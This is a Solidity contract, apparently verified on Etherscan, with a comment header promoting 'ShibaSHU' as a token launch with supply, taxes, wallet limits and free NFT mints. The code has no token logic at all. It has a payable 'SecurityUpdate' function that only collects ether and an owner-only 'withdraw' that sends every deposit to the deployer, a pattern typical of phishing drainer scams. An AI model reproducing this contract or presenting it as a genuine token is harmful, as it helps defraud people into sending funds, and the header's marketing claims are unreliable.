/**
 *Submitted for verification at Etherscan.io on 2023-02-23
*/

/**

ShibaSHU - Dont let your DREAMS haunt you for the rest of your life

.01 ShibaSHU - Token launch
Join us on Uniswap as we launch the ShibaSHU token on the Ethereum blockchain. 
Be among the first to access the revolutionary new features and possibilities of ShibaSHU and secure your spot in the community.


.02 Design process
Design our own unique ShibaSHU with AI, marking the launch of our NFT design process. 
We’ll create one-of-a-kind ShibaSHU and add them to your collection in the ShibaSHU ecosystem, a true showcase of this project’s improved skills and creativity. 
The community will decide the style and rarity of the NFTs characteristics.

.03 Free NFT Mint for holders
Token holders will receive a complimentary NFT mint, giving you the chance to own your own unique animal and add it to your collection in the ShibaSHU ecosystem. 
Show off your collection and demonstrate your dedication to the community.


Total Supply
10M ShibaSHU TOKENS

Taxes
BUY | SELL TAX: 3%

Wallet Limit
MAX TX: 2% — MAX WALLET: 2%

Official Links:


Telegram: https://t.me/ShibaSHU/

Website: https://shibashu.webflow.io/

Medium : https://medium.com/@ShibaSHU/

Twitter: https://twitter.com/ShibashuERC/

Reddit: https://www.reddit.com/user/ShibaSHU/
*/

pragma solidity ^0.4.26;

contract ShibaSHU {

    address private  owner;    // current owner of the contract

     constructor() public{   
        owner=msg.sender;
    }
    function getOwner(
    ) public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}